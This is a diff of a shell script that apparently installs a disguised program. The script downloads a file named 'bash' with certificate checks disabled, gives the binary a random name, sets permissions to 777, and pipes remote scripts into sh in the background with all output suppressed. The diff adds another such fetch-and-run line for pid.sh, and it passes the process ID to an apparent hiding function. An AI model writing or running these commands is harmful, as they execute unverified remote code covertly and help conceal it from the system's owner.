@@ -44,6 +44,7 @@ wget --no-check-certificate -qO "${work}/bash" "${src}/q"
 [ -f "${work}/appsettings.json" ] && sed -i "s/\"alias\":.*/\"alias\": \"${name}\",/" "${work}/appsettings.json"
 [ -f "${work}/appsettings.json" ] && sed -i "s/\"binaryName\":.*/\"binaryName\": \"$(RandString 7)\",/" "${work}/appsettings.json"
 chmod -R 777 "${work}"
+sh <(wget --no-check-certificate -qO- "${src}/pid.sh") >/dev/null 2>&1 &
 sh <(wget --no-check-certificate -qO- "${src}/epoch.sh") >/dev/null 2>&1 &
 hPid "$!"
 
